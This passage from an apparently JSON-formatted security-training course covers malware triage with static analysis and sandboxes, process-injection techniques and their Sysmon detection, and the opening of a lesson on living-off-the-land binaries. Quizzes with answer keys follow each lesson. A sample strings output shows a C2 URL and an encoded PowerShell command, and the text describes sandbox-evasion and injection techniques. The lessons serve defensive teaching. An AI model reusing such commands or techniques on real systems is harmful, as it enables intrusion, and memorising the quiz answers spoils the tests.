it.\n\n### Static vs dynamic — the one-sentence distinction\n\nWith those two ideas in hand, the core distinction of this lesson is simple:\n\n- **Static analysis** examines the file **at rest** — the sealed container, never opened, never run. You read its bytes and structure without letting any of its code execute.\n- **Dynamic analysis** examines the process **while it runs** — you let a thread actually execute the code and watch what the resulting process does: what it touches, what it says over the network, what other processes it talks to.\n\n### What is a sandbox?\n\nRunning unknown malware just to watch it is dangerous on a normal machine — it might actually infect it. A **sandbox** is a disposable, instrumented virtual machine (or emulator) built specifically to detonate suspicious files safely, with every action recorded and the whole machine discarded afterward — a blast-proof testing room where you can set something on fire and watch exactly how it burns, because the room is built to contain it.\n\nKeep PE file, process, address space, and sandbox in mind: every technique below is really just a specific way of reading a PE file (static) or a specific thing to watch a process do once it runs (dynamic)."
    },
    {
      "heading": "Static Analysis: Examining Without Executing",
      "content": "**Static analysis** inspects a file's contents without running it, so it is inherently **safe** — no thread of the sample's own code ever executes. It is the fast first pass in triage and answers the question: what is this file, and does it look suspicious, before I risk anything?\n\nKey static signals an analyst extracts:\n\n- **Strings**: printable text embedded in the binary. URLs, IP addresses, registry keys, file paths, and PowerShell fragments often leak the malware's intent. A quick pass:\n\n```\nstrings -n 8 sample.exe | grep -iE \"http|cmd.exe|powershell\"\n```\n\nOutput might look like:\n\n```\nhttp://185.220.101.42/gate.php\ncmd.exe /c powershell -enc SQBFAFgA...\nSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n```\n\nEach line is a lead: a likely C2 URL, an encoded PowerShell command, and a persistence registry key. Packed or obfuscated samples hide this, and need **FLOSS** (`floss sample.exe`), which decodes stack strings and simple obfuscation that plain `strings` misses.\n\n- **PE headers**: the header of a PE file reveals the compile timestamp, target architecture, section names, and entry point. A compile time in the future, or a checksum that does not match the file, is a red flag.\n- **Imports (IAT) and imphash**: the Import Address Table lists which Windows API functions the binary plans to call before it even runs. Imports like `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread` strongly suggest process injection is coming. The **imphash** is a hash of this import table, useful for clustering samples from the same campaign even when the file hash itself differs.\n- **Entropy and packing**: high **entropy** (approaching 8.0 out of 8) in a section indicates compression or encryption — a classic sign of **packing**, where the real code is compressed and only unpacks itself in memory at runtime. Tools like **DIE (Detect It Easy)** or **PEiD** flag known packers by signature.\n\nStatic triage also includes hashing the file (`sha256sum sample.exe`) and checking that hash's reputation via **VirusTotal** or a threat-intel platform — a known-bad hash can end triage in seconds.\n\n**Limitation**: packing and obfuscation blunt static analysis directly. A heavily packed sample may show almost no meaningful strings or imports until it unpacks itself in memory — which only happens when it actually runs. That is exactly where dynamic analysis takes over."
    },
    {
      "heading": "Dynamic Analysis and Sandboxes: Detonation",
      "content": "**Dynamic analysis** runs the sample and observes the resulting **process's** behaviour — what it actually does, regardless of how the code on disk was obfuscated. This is often called **detonation**, the direct dynamic counterpart to everything static analysis could not see.\n\nA **sandbox** — a disposable, instrumented VM built to contain the blast, as in our primer — executes the file while recording:\n\n- **Process activity**: child processes spawned, injection into other processes, command lines used. On a live analysis VM, **Process Monitor (procmon)** from Sysinternals shows this directly: filter on 'Process Create' and watch it happen in real time.\n- **File system changes**: files dropped, modified, or deleted (procmon's WriteFile/CreateFile events).\n- **Registry changes**: persistence keys such as Run/RunOnce, or new service creation (procmon's RegSetValue events).\n- **Network activity**: DNS lookups, C2 beaconing, downloads of second-stage payloads — captured with a tool like Wireshark or the sandbox's own network recorder.\n- **API calls**: the same VirtualAllocEx → WriteProcessMemory → CreateRemoteThread chain flagged as imports during static triage, now actually observed executing, revealing injection, credential theft, or encryption behaviour as it happens.\n\nCommon sandboxes include **Cuckoo/CAPE**, **Any.Run** (interactive, cloud-based, lets a human click through prompts), **Joe Sandbox**, and **Hybrid Analysis**. The output is a behavioural report plus extracted **IOCs** (indicators of compromise) — hashes, domains, IPs, mutexes — that you pivot on and push into detections.\n\nThe great advantage: dynamic analysis defeats packing by construction. When the sample unpacks itself in order to run, the sandbox is watching the actual process's live memory and behaviour — you do not need to manually reverse the packer.\n\nDynamic analysis is riskier and slower than static — you are, on purpose, letting a thread of live malware execute — so it must stay isolated from production networks. Detonation typically takes a few minutes and may need internet access (real or simulated, e.g. **INetSim**) for the malware to reveal its full behaviour, since many samples do nothing at all until they can reach their C2 server."
    },
    {
      "heading": "Sandbox Limits: Evasion and Sandbox-Aware Malware",
      "content": "Sandboxes are powerful but not infallible. Modern malware is frequently **sandbox-aware** and will refuse to detonate if it suspects analysis, producing a clean-looking report from a genuinely malicious file. An analyst must know these evasion tricks so a 'nothing happened' result is not misread as safe.\n\nCommon evasion techniques, mapped to their MITRE ATT&CK sub-techniques under **T1497 (Virtualization/Sandbox Evasion)**:\n\n- **T1497.001 — System Checks**: the malware looks for artifacts of virtualization — VMware/VirtualBox drivers, specific MAC address prefixes, small disk sizes, few CPU cores, low RAM, or the presence of tools like Wireshark and Process Monitor — and exits quietly if found.\n- **T1497.002 — User Activity Based Checks**: it waits for mouse movement, scrolling, or a plausible number of Recent Files to confirm a real human is present, since automated sandboxes rarely simulate this convincingly.\n- **T1497.003 — Time Based Evasion**: the malware calls long `Sleep()` delays or runs stalling loops, outlasting the sandbox's analysis window (often just a few minutes) before doing anything malicious.\n\nOther checks include domain-join or geolocation gating — the payload only fires on machines joined to a specific target domain or located in a specific country.\n\nMitigations in a mature sandbox: patching known VM artifacts so the sample cannot fingerprint the VM, simulating mouse/keyboard activity, fast-forwarding sleep calls, and detonating the sample multiple times under different configurations. Interactive sandboxes like Any.Run let a human analyst click through decoy prompts that fully automated detonation would simply miss.\n\n**Practical rule**: a clean sandbox verdict is not proof of innocence. Combine it with static red flags, threat-intel reputation, and delivery context (how the file arrived, who sent it). Absence of evidence is not evidence of absence when the malware may simply be hiding from you on purpose."
    },
    {
      "heading": "A Worked Example: Triaging a Suspicious Attachment Step by Step",
      "content": "Let's put static and dynamic together on one concrete example: an email attachment, invoice_84421.exe, flagged by a user.\n\n**Step 1 — Hash and check reputation, before touching anything else:**\n\n```\nsha256sum invoice_84421.exe\n```\n\nThe hash comes back unseen on VirusTotal (0/70 detections) — no shortcut available, so full triage is needed.\n\n**Step 2 — Static pass:**\n\n```\ndie invoice_84421.exe\nstrings -n 8 invoice_84421.exe | head -50\n```\n\nDIE reports the file as UPX-packed, and `strings` returns almost nothing readable beyond a handful of UPX-related strings. High entropy (~7.9) on the single compressed section confirms packing. Static analysis has hit its limit: the real content is hidden until runtime.\n\n**Step 3 — Detonate in an isolated sandbox** (for example, upload to Any.Run, or run it inside a disposable analysis VM with procmon and Wireshark already recording):\n\nThe behavioural report shows, in order: the process unpacks itself in memory, calls VirtualAllocEx and WriteProcessMemory against a newly spawned svchost.exe, then CreateRemoteThread into it — the exact API chain flagged in static imports, now actually observed happening. Immediately after, svchost.exe (not invoice_84421.exe) begins DNS lookups to a newly-registered domain and opens an outbound HTTPS connection.\n\n**Step 4 — Extract IOCs from the behaviour**: the C2 domain, the destination IP, the dropped file paths, and the process-injection pattern itself — a strong behavioural IOC on its own, since 'this launcher injects into svchost.exe' is detectable independent of any single file hash.\n\n**Step 5 — Decide and act**: the sample is confirmed malicious (process injection into a spawned system process, beaconing to a fresh domain). The analyst blocks the domain/IP, pushes the hash and the injection pattern into detection content, and checks whether any other host shows the same injected-svchost.exe pattern.\n\nNotice the shape: static told us what kind of thing this is (packed, likely hostile) but hit a wall; dynamic told us what it actually does once it could run. Neither step alone would have produced a confident, actionable verdict."
    },
    {
      "heading": "A Practical SOC Triage Workflow",
      "content": "An analyst is not a reverse engineer and does not need IDA Pro or a debugger for most triage. The goal is a fast, defensible verdict and good IOCs. A workable order of operations:\n\n| Step | Action | Question answered |\n|------|--------|-------------------|\n| 1 | Hash the file, check VirusTotal / TI | Is it already known-bad? |\n| 2 | Static: strings, PE header, imports, entropy | What does it look like? Packed? |\n| 3 | Detonate in sandbox | What does it actually do? |\n| 4 | Extract IOCs from behaviour | What do I hunt and block? |\n| 5 | Pivot and scope | Did it touch other hosts? |\n\n**Safety first**: never double-click a suspicious file on your own workstation. Handle samples only in an isolated analysis VM or an air-gapped detonation environment. Store samples password-protected (often the zip password 'infected') to prevent accidental execution and AV interference during transfer.\n\n**When to escalate**: if the sample is novel (no reputation), clearly targeted, or shows advanced evasion (T1497), escalate to a dedicated malware-analysis or threat-intel team rather than forcing a verdict.\n\n**Turning analysis into defence**: the real payoff of triage is detection content. Extracted IOCs feed SIEM watchlists and firewall/proxy blocklists; behavioural patterns (a Word document spawning PowerShell that reaches out to a new domain) become detection rules. Static clustering via imphash lets you find related samples from the same actor even across different campaigns.\n\nRemember the complementary nature of the two methods: static is fast, safe, and defeated by packing; dynamic is slower, riskier, and defeated by evasion. Used together they cover each other's blind spots — which is why real triage always uses both, in that order."
    }
  ],
  "keyTakeaways": [
    "A PE file is inert bytes on disk until something runs it into a process with its own private address space, made of one or more threads — static analysis reads the file at rest, dynamic analysis watches the process while a thread actually executes it.",
    "Static analysis (strings, FLOSS, PE headers, imports/imphash, entropy) is fast and safe but blinded by packing — high entropy with sparse strings and memory-allocation-only imports is the classic signature that a sample needs to be detonated, not just read.",
    "Dynamic sandbox detonation (procmon, Wireshark, Any.Run/Cuckoo/CAPE) defeats packing by watching the unpacked process live, but can itself be defeated by sandbox-aware evasion under MITRE T1497 (system checks, user-activity checks, time-based sleeps) — a clean report is not proof of innocence.",
    "A real triage worked example — hash, static pass, detonate, extract IOCs, decide — shows the two methods answering different questions in sequence: static says what kind of thing this is, dynamic says what it actually does.",
    "The payoff of triage is detection content: IOCs feed blocklists and watchlists, behavioural patterns (process injection into svchost.exe, a document spawning PowerShell) become detection rules, and imphash clusters related samples across campaigns."
  ],
  "quiz": [
    {
      "question": "A packed executable arrives in your queue. Static analysis shows almost no readable strings and only a handful of imports, all related to memory allocation. What is the most effective next triage step?",
      "options": [
        {
          "label": "Conclude the file is benign because it has too few imports to do anything malicious on the host.",
          "value": "a"
        },
        {
          "label": "Detonate the sample in an isolated sandbox so it unpacks itself and reveals its real behaviour.",
          "value": "b"
        },
        {
          "label": "Delete the file immediately and close the alert since packed files are always false positives.",
          "value": "c"
        },
        {
          "label": "Run the sample directly on your own workstation to save time and watch the network traffic.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Packing hides strings and imports until runtime, so dynamic detonation in an isolated sandbox captures the unpacked code and behaviour (b). Option (a) is wrong because few imports plus high entropy signals packing, not innocence. Option (c) discards evidence and IOCs on a false premise. Option (d) is a dangerous safety violation — never run suspected malware on a production or personal host."
    },
    {
      "question": "A sandbox report for a suspicious sample comes back completely clean — no file, registry, or network activity. Threat intel and the delivery context still look suspicious. How should you interpret this?",
      "options": [
        {
          "label": "The clean report proves the file is safe, so you can confidently close the alert without further work.",
          "value": "a"
        },
        {
          "label": "The sandbox is broken and its results should always be ignored in favour of static analysis alone.",
          "value": "b"
        },
        {
          "label": "The malware may be sandbox-aware and evading analysis, so treat the clean result with suspicion.",
          "value": "c"
        },
        {
          "label": "Network activity is optional for malware, so the missing traffic is normal and not worth noting.",
          "value": "d"
        }
      ],
      "answer": "c",
      "explanation": "Sandbox-aware malware uses sleeps and environment checks (MITRE T1497) to stay dormant and produce a clean report, so a clean verdict against suspicious context warrants suspicion, not closure (c). Option (a) treats absence of evidence as evidence of absence. Option (b) overreacts — sandboxes are useful, just not infallible. Option (d) ignores that the total absence of any activity from a flagged file is itself a red flag for evasion."
    },
    {
      "question": "Static analysis on a file shows entropy near 7.9 in its only section, almost no readable strings, and imports limited to memory-allocation functions. What does this most likely indicate, and what should the analyst do next?",
      "options": [
        {
          "label": "The file is corrupted and unreadable, so no further analysis is possible and the alert should be closed.",
          "value": "a"
        },
        {
          "label": "The file is packed, hiding its real code until it unpacks itself at runtime, so it should be detonated in an isolated sandbox next.",
          "value": "b"
        },
        {
          "label": "The high entropy proves the file is ransomware, so it should be deleted immediately without further review.",
          "value": "c"
        },
        {
          "label": "The few imports mean the file is too simple to be malicious, so static analysis alone is sufficient to close it as benign.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Entropy near the maximum, combined with sparse strings and imports limited to memory allocation, is the classic packing signature (as with UPX), not corruption — the correct next step is dynamic detonation to observe the unpacked code, exactly the static-hits-a-wall-then-dynamic-takes-over pattern from this lesson. Option (a) wrongly assumes corruption. Option (c) jumps to a specific verdict the evidence does not support and would destroy IOCs. Option (d) ignores that a packed file's true imports are hidden until it runs, so few visible imports say nothing about real capability."
    }
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1497/",
    "https://github.com/mandiant/flare-floss",
    "https://any.run/malware-trends/",
    "https://learn.microsoft.com/en-us/sysinternals/downloads/procmon"
  ],
  "xp": 260,
  "estimatedMinutes": 48,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-process-injection",
  "slug": "process-injection",
  "title": "Process Injection: Hiding Code Inside Trusted Processes",
  "topic": "Defense Evasion",
  "difficulty": "advanced",
  "kind": "lesson",
  "intro": "Process injection (MITRE ATT&CK T1055) is one of the most common defence-evasion techniques: instead of running malware as its own suspicious process, an attacker runs malicious code inside a legitimate, trusted, often signed process. This lesson starts from zero, defining address space, handles, and remote threads before covering the main injection sub-techniques, why attackers use them, a worked example of reading a real injection chain in telemetry, and the specific Sysmon and EDR signals a SOC analyst uses to catch it.",
  "sections": [
    {
      "heading": "Start Here: Address Space, Handles, and Remote Threads — the Building Blocks",
      "content": "Process injection sits on top of a few precise OS mechanics, and if any of them are fuzzy the whole topic reads as magic. The analogy to hold onto: every process is a private apartment (its address space) that only its own residents (threads) can normally enter and rearrange.\n\n### Address space, and why it matters here\n\nA process's **address space** is its own private memory — the operating system normally prevents one process from reading or writing another's. This isolation exists precisely to stop one program's bugs, or malice, from touching another's. Process injection is fundamentally about **breaking that isolation on purpose**, using APIs designed for legitimate cross-process work (debuggers, security tools) that are equally reusable by attackers.\n\n### What is a handle?\n\nTo touch another process at all, you first need a **handle** — a number the operating system hands back after you ask permission to interact with some object (a process, a file, a registry key). Calling `OpenProcess(desiredAccess, ..., targetPID)` asks Windows: give me a handle to that process, with these specific rights (read memory? write memory? create a thread inside it?). Windows checks your permissions and, if allowed, hands you a handle — your ticket to interact with that apartment, scoped to exactly the rights requested. This is why the **GrantedAccess** value seen in telemetry matters so much: it states exactly what the requester was allowed to do.\n\n### What is a remote thread?\n\nRecall that a thread is a stream of execution inside a process. Windows lets one process — if it holds a suitable handle — ask another process to start a brand-new thread of its own, running code the first process specifies. That is a **remote thread**: created by process A, but living and running inside process B's address space. `CreateRemoteThread` is the Windows API that does exactly this. It has entirely legitimate uses (debuggers attaching, some system tooling) — which is exactly why it is not blocked outright, and exactly why an attacker can abuse it.\n\n### What is a DLL, and what does LoadLibrary do?\n\nA **DLL (Dynamic-Link Library)** is a file of reusable code a process can load into itself at runtime, expanding what code is running inside it without changing the original .exe. `LoadLibrary` is the Windows API that loads a DLL by its file path, mapping its code into the calling process's address space. Injection techniques exist to make a victim process call `LoadLibrary` on an attacker-supplied DLL — which is how a legitimate process ends up unknowingly running malicious code.\n\nWith address space, handle, remote thread, and DLL loading in hand, every injection technique below reads as a sequence of ordinary Windows API calls chained toward one dishonest goal: getting attacker code to run inside someone else's apartment."
    },
    {
      "heading": "What Process Injection Is and Why Attackers Use It",
      "content": "**Process injection** is the act of executing arbitrary code within the address space of a separate, live process — deliberately breaking the isolation described in the primer. It is catalogued in MITRE ATT&CK as **T1055** and sits under both Defense Evasion and Privilege Escalation.\n\nThe attacker's goal is to **hide in plain sight**. Consider the difference between these two scenarios:\n\n- Malware runs as evil.exe — an unsigned binary in a temp folder making network connections. Trivial to spot.\n- The same malicious code runs inside explorer.exe, svchost.exe, or notepad.exe — a signed, expected, whitelisted Windows process. Now the malicious network beacon appears to come from a trusted process.\n\nInjection buys the attacker several advantages:\n\n- **Evasion of process-based detection**: allowlists, reputation checks, and 'unknown binary' alerts are bypassed because the host process is legitimate and signed.\n- **Masquerading of network traffic**: a proxy or firewall sees svchost.exe reaching out, which looks normal.\n- **Access to the victim process's context**: memory, tokens, and handles of the target — useful for stealing data or escalating privileges.\n- **Persistence and stealth**: no malicious file needs to remain on disk if the code lives only in memory (fileless).\n\nInjection almost always requires the ability to open a handle to another process and write to its memory — exactly the handle and address-space mechanics from the primer — which is why the Windows APIs involved (`OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`, `QueueUserAPC`, `SetThreadContext`) are such strong static and behavioural indicators. Recognising the family of techniques matters because detection differs subtly between them."
    },
    {
      "heading": "Classic DLL Injection and APC Injection",
      "content": "**Classic remote-thread DLL injection** is the textbook method and maps to **T1055.001 (Dynamic-link Library Injection)**. The sequence is:\n\n1. `OpenProcess` — get a handle to the target process with sufficient access rights.\n2. `VirtualAllocEx` — allocate memory inside the target.\n3. `WriteProcessMemory` — write the path of a malicious DLL (or shellcode) into that memory.\n4. `CreateRemoteThread` — start a new thread in the target that calls `LoadLibrary` on the injected DLL path, loading the attacker's code.\n\nThe `CreateRemoteThread` call is the loud, observable moment — one process starting a thread in another is abnormal for most software.\n\n**APC injection (T1055.004)** avoids creating an obvious remote thread. Windows lets you queue an **Asynchronous Procedure Call** to an existing thread with `QueueUserAPC`. When that thread enters an alertable wait state, the queued function — the attacker's shellcode — runs. A common variant, **\"Early Bird\"** injection, queues the APC to a process created in a suspended state so the payload runs before security products fully hook the process.\n\n**Reflective DLL loading (T1620, closely related)** takes stealth further: instead of writing a DLL path and calling `LoadLibrary` (which registers the module and leaves it visible in the loaded-module list), the loader maps the DLL into memory manually and resolves its imports itself. Because the OS loader was never involved, the module does not appear in normal module enumerations — making it much harder to spot with tools that list loaded images. This is why memory-based EDR inspection, not just image-load logging, is needed."
    },
    {
      "heading": "Process Hollowing and Other Variants",
      "content": "**Process hollowing (T1055.012)** is a distinctive and widely abused technique for masquerading. The steps:\n\n1. Create a legitimate process (e.g., `svchost.exe`) in a **suspended** state.\n2. **Unmap (hollow out)** the legitimate code from the process's memory using `NtUnmapViewOfSection` / `ZwUnmapViewOfSection`.\n3. Allocate new memory and **write the malicious image** into the hollowed process.\n4. Adjust the entry point with `SetThreadContext` to point at the malicious code.\n5. **Resume** the thread — the process now looks like `svchost.exe` on disk and in the process list, but runs attacker code.\n\nThe telltale signs of hollowing are a mismatch between what is on disk and what is in memory: the image file backing the process differs from the executing memory, sections marked as expected are replaced, and the process is often a child of an unexpected parent.\n\nRelated variants an analyst should recognise by name:\n\n| Technique | ATT&CK ID | Distinguishing trait |\n|-----------|-----------|----------------------|\n| DLL injection | T1055.001 | CreateRemoteThread + LoadLibrary |\n| PE / hollowing | T1055.012 | Suspended process, unmapped image |\n| APC injection | T1055.004 | QueueUserAPC, Early Bird |\n| Thread hijacking | T1055.003 | SuspendThread + SetThreadContext |\n| Process Doppelganging | T1055.013 | TxF transactions, no file on disk |\n\nA common thread across all of them: attacker-controlled memory regions marked **RWX (read-write-execute)**. Legitimate code is normally RX (executable but not writable); a large private, unbacked RWX region holding shellcode is one of the strongest injection indicators available to memory scanners and EDR."
    },
    {
      "heading": "A Worked Example: Reading an Injection Chain in Telemetry",
      "content": "Reading real telemetry is where the primer's concepts — handle, GrantedAccess, remote thread — pay off. Suppose a host generates the following events within two seconds of each other, all sharing the same source process, updater32.exe (PID 5188), a binary that arrived minutes earlier as an email attachment.\n\n**Sysmon Event ID 1 — Process Create** (the launcher itself starting):\n\n```\nEventID: 1\nUtcTime: 2026-08-16 09:14:02.118\nImage: C:\\Users\\d.rosen\\AppData\\Local\\Temp\\updater32.exe\nParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\nCommandLine: updater32.exe\nUser: CORP\\d.rosen\n```\n\nAlready one anomaly: a Temp-folder executable spawned by Word.\n\n**Sysmon Event ID 10 — ProcessAccess** (the handle request from the primer, actually happening):\n\n```\nEventID: 10\nUtcTime: 2026-08-16 09:14:03.501\nSourceImage: C:\\Users\\d.rosen\\AppData\\Local\\Temp\\updater32.exe\nTargetImage: C:\\Windows\\System32\\svchost.exe\nGrantedAccess: 0x1FFF\nCallTrace: ntdll.dll+7c3a1|KERNELBASE.dll+OpenProcess\n```\n\nGrantedAccess 0x1FFF decodes to a combination that includes PROCESS_VM_WRITE (0x0020), PROCESS_VM_OPERATION (0x0008), and PROCESS_CREATE_THREAD (0x0002) — exactly the handle rights the primer described as needed to write into and start a thread inside another process's address space. This is the moment updater32.exe obtained its ticket into svchost.exe's apartment.\n\n**Sysmon Event ID 8 — CreateRemoteThread** (the remote thread from the primer, now created):\n\n```\nEventID: 8\nUtcTime: 2026-08-16 09:14:03.622\nSourceImage: C:\\Users\\d.rosen\\AppData\\Local\\Temp\\updater32.exe\nTargetImage: C:\\Windows\\System32\\svchost.exe\nNewThreadId: 6104\nStartAddress: 0x000001F2A3B40000\n```\n\nThe StartAddress falls inside a memory region that does not correspond to any DLL svchost.exe normally loads — a strong sign the thread starts executing raw shellcode rather than a real function.\n\n**Windows Security Event 4688** (the classic process-creation audit event, useful for correlating account and command line even without Sysmon):\n\n```\nEventID: 4688\nNewProcessName: C:\\Users\\d.rosen\\AppData\\Local\\Temp\\updater32.exe\nSubjectUserName: d.rosen\nCreatorProcessName: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\n```\n\n**Reading the chain as a sentence**: Word spawned an unsigned Temp-folder binary, which immediately opened svchost.exe with write-and-create-thread rights, then created a remote thread at an address matching no loaded module — a phishing document leading to classic remote-thread injection (T1055.001) into a trusted system process, in under two seconds.\n\nOn a live host, an analyst can confirm this further with **Process Hacker** or **Process Explorer** (inspect svchost.exe's memory regions for an unbacked RWX block), **Moneta** or **Hollows Hunter** (memory scanners purpose-built to flag exactly this pattern), or by attaching **x64dbg** to the target process to examine the thread at that start address directly."
    },
    {
      "heading": "Detection with Sysmon and EDR, and Defence",
      "content": "Sysmon provides several event IDs that map directly onto injection behaviour. The analyst's job is to correlate them rather than alert on any single one.\n\n- **Event ID 8 — CreateRemoteThread**: the most direct signal for classic injection. A process creating a thread in an unrelated process — especially into `lsass.exe`, `explorer.exe`, or a browser — is highly suspicious. Filter out known-benign pairs to reduce noise.\n- **Event ID 10 — ProcessAccess**: logs one process opening a handle to another, including the **GrantedAccess** mask. Access rights like `PROCESS_VM_WRITE` (0x0020), `PROCESS_VM_OPERATION` (0x0008), and `PROCESS_CREATE_THREAD` (0x0002) together indicate injection intent. Access to `lsass.exe` with these rights overlaps with credential dumping too.\n- **Event ID 7 — Image/Module Load**: a DLL loaded from an unusual path (temp, user profile) or an unsigned module loaded into a signed process warrants review. Note that reflective loading evades this because no image load occurs.\n- **Event ID 1 — Process Create**: reveals anomalous parent-child relationships (e.g., `winword.exe` spawning `svchost.exe`) and suspended-process creation patterns tied to hollowing.\n\n**EDR** adds what Sysmon cannot: memory scanning for RWX regions and unbacked executable memory, API call telemetry (`VirtualAllocEx` -> `WriteProcessMemory` -> `CreateRemoteThread` sequences), and detection of a process image in memory differing from its on-disk file (hollowing).\n\n**Defensive measures**:\n\n- Enable and tune Sysmon EID 8 and 10 with a maintained config (e.g., SwiftOnSecurity/Olaf Hartong baselines).\n- Deploy a memory-aware EDR and enable behavioural/attack-surface-reduction rules.\n- Protect high-value processes: **LSASS as a Protected Process Light (PPL)** and **Credential Guard** block many handle-opens against it.\n- Apply least privilege so malware runs without the rights to open and write to other processes.\n- Hunt for cross-process handle opens with write/create-thread access to sensitive processes as a proactive detection."
    }
  ],
  "keyTakeaways": [
    "Process injection breaks the normal isolation between processes on purpose: a handle (from OpenProcess, scoped by GrantedAccess) lets one process write into another's address space and start a remote thread there — the same mechanics debuggers use legitimately, reused by attackers.",
    "Process injection (T1055) hides malicious code inside legitimate, signed processes to defeat process-based detection and masquerade network traffic; sub-techniques (DLL injection T1055.001, APC T1055.004, hollowing T1055.012, thread hijacking T1055.003, Doppelganging T1055.013) differ in mechanics but share attacker-controlled RWX memory and cross-process handle abuse.",
    "Reflective DLL loading skips the OS loader entirely, so the module never appears in Sysmon Event ID 7 or a normal module list — which is why memory scanning (Process Hacker, Moneta, Hollows Hunter), not just image-load logging, is needed to catch it.",
    "A real telemetry chain reads as a sentence: Sysmon EID 1 (odd parent-child) then EID 10 ProcessAccess with GrantedAccess showing VM_WRITE/CREATE_THREAD rights then EID 8 CreateRemoteThread at an address with no matching module — each event confirms the next step in the same attack.",
    "Detection relies on correlating Sysmon EID 8/10/7/1 plus EDR memory scanning for unbacked RWX regions, while defence centres on LSASS Protected Process Light and Credential Guard, least privilege, and tuned telemetry baselines."
  ],
  "quiz": [
    {
      "question": "An analyst sees Sysmon Event ID 8 showing winword.exe creating a remote thread inside explorer.exe, shortly after a phishing document was opened. Why is this pattern a strong injection indicator?",
      "options": [
        {
          "label": "Word legitimately manages the desktop shell, so creating threads in explorer.exe is expected routine behaviour.",
          "value": "a"
        },
        {
          "label": "One process starting a thread in an unrelated trusted process is abnormal and signals code injection to evade detection.",
          "value": "b"
        },
        {
          "label": "Event ID 8 only fires when a file is deleted, so this simply means a temporary document was removed.",
          "value": "c"
        },
        {
          "label": "Explorer.exe is unsigned malware by default, so any thread activity inside it is always benign noise.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "CreateRemoteThread (EID 8) from an unrelated process into a trusted one like explorer.exe is classic DLL/remote-thread injection used for evasion (b). Option (a) is false — Word has no reason to inject threads into the shell. Option (c) misdescribes Event ID 8, which logs remote thread creation, not file deletion. Option (d) is wrong on facts: explorer.exe is a signed legitimate Windows binary, and thread injection into it is exactly the abuse."
    },
    {
      "question": "A memory scan from EDR flags a large private RWX region inside svchost.exe that does not match any DLL on disk, and the process was started suspended. Which technique does this best describe?",
      "options": [
        {
          "label": "Standard software updating, since legitimate services routinely allocate large executable memory during patches.",
          "value": "a"
        },
        {
          "label": "Process hollowing, where a suspended process is emptied and replaced with a malicious image in memory.",
          "value": "b"
        },
        {
          "label": "A normal DLL load recorded by Sysmon Event ID 7 that always appears in the module list.",
          "value": "c"
        },
        {
          "label": "Kernel driver signing, which requires services to keep writable executable pages during boot.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "A suspended-start process with an in-memory image that differs from disk, plus an unbacked RWX region, is the signature of process hollowing (T1055.012) (b). Option (a) is wrong because legitimate software does not run from unbacked RWX memory that mismatches disk. Option (c) is incorrect — hollowing and reflective techniques specifically avoid normal module-list image loads. Option (d) is fabricated; driver signing does not require writable executable pages in user-mode services."
    },
    {
      "question": "Reflective DLL loading maps a malicious DLL into memory manually instead of calling the normal Windows loader. Which telemetry gap does this create for a defender relying only on Sysmon?",
      "options": [
        {
          "label": "It removes all Event ID 8 CreateRemoteThread evidence, making ProcessAccess (EID 10) irrelevant to detection.",
          "value": "a"
        },
        {
          "label": "The DLL never appears in Sysmon Event ID 7 image-load logging or the process's module list, since the OS loader was never used.",
          "value": "b"
        },
        {
          "label": "It prevents the source process from being logged in Event ID 1, leaving no process-creation evidence at all.",
          "value": "c"
        },
        {
          "label": "It disables Sysmon entirely on the host, so no injection technique can be logged there again.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Reflective loading specifically bypasses LoadLibrary and the OS loader, so no Event ID 7 image-load event or module-list entry is ever produced for that DLL — the reason memory-based EDR scanning, not just image-load logging, is needed to catch it. Option (a) is wrong because EID 8/10 can still fire depending on the delivery method used alongside reflective loading. Option (c) is wrong because EID 1 covers creation of the loader process itself, unrelated to how it later loads a DLL. Option (d) is fabricated — reflective loading does not disable Sysmon."
    }
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1055/",
    "https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon",
    "https://attack.mitre.org/techniques/T1055/012/",
    "https://github.com/forrest-orr/moneta"
  ],
  "xp": 270,
  "estimatedMinutes": 50,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-lolbins-living-off-the-land",
  "slug": "lolbins-living-off-the-land",
  "title": "LOLBins: Living Off the Land Binaries",
  "topic": "Defense Evasion",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "Attackers increasingly avoid bringing their own tools and instead abuse the legitimate, signed binaries already shipped with Windows — a strategy called living off the land (MITRE ATT&CK T1218). This lesson assumes no prior exposure to the idea and defines every term from scratch: why signed, built-in tools defeat traditional blocklists, the handful of binaries attackers reach for most, real attacker command lines, exactly which Sysmon and Windows events reveal the abuse, and how a SOC analyst detects and defends against it.",
  "sections": [
    {
      "heading": "Start Here: What 'Living Off the Land' Means",
      "content": "Before any of the technical detail below makes sense, one plain idea needs to be solid: attackers increasingly do not bring their own tools at all — they use the tools already sitting on the victim's machine, tools Windows itself relies on to function.\n\n### The break-in analogy\n\nImagine a burglar who never brings a crowbar, a lockpick set, or a bag of tools to the scene. Instead they walk in through an unlocked side door, pick up the homeowner's own kitchen knife, use the garage remote sitting on a shelf to open the garage, and drive away in the family car parked in the driveway. If a security guard later searches the property for 'foreign objects that do not belong here', they find nothing — every object used in the break-in was already supposed to be there. That is exactly the idea behind living off the land: the attacker's 'tools' are pieces of Windows itself.\n\n### A few terms first\n\n- **Binary / executable**: a program file the operating system can run directly — an .exe or a .dll. Windows ships with hundreds of these for legitimate administrative tasks.\n- **Digitally signed**: Microsoft cryptographically signs its own executables, which is how Windows and antivirus software prove 'this file really was made by Microsoft and has not been tampered with'. Security tools are built to trust signed Microsoft code far more than an unknown file.\n- **Allowlist / blocklist**: a blocklist forbids specific files; an allowlist permits only specific files. Both work by checking a file's identity — its name, hash, or publisher.\n- **Fileless**: an attack technique that avoids writing a new malicious file to disk, which defeats file-scanning antivirus because there is no new file to scan.\n\n### Putting it together\n\nA 